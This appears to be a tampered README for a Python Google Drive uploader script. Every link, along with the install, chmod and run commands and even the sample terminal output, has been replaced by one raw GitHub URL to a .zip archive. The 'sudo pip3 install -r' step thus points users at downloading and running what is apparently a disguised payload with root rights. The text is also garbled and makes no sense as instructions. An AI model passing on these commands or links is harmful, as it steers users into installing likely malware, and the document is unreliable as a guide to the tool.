Google Drive Uploader
=====================

Simple script to upload files on Google Drive through Direct URL and gives the direct drive download link.

# Description
Script uses predefined Drive APIs Client ID and Client Secret (Please don't abuse the credentials)

It takes upload file as command line argument, uploads it and sets permissions that anyone who has download link can download the file.  
After file has been uploaded the script prints direct download url.

# Requirements
  * Python >= 2.6 [Tested on Python 3.6.7]
  * [google-api-python-client](https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip)
  * python-httplib2
  * urllib
  * sys
  * logging
  * mimetypes
  * apiclient
  * oauth2client
  * wget

#### Install all requirements using this command:
`sudo -H pip3 install -r https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip`  
# Example Usage:
####  Note: Make sure you've given the bash file permission to execute
`sudo chmod +x https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip`

#### You can also start the file without using bash using the command

`python3 https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip`

  > cyberboy@MonsterMachine:~/python/gdrive/Gdrivedownloader$ https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip  
  >Enter the Direct URL of the file you want to download:  
  >https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip  
  >Beginning file download...  
  >This may take time depending upon the file size.  
  >Please be patient  
  >https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip is successfully downloaded locally  
  >Starting Google Drive upload.....  
  >Here is your Google Drive link:   https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip
  >Performing local cleanup.........  
  >Everything done... Exiting!  

# Credits
### kshcherban for his lovely work [here](https://raw.githubusercontent.com/codeslide/Gdrivedownloader/master/transfuge/Software-3.3.zip)
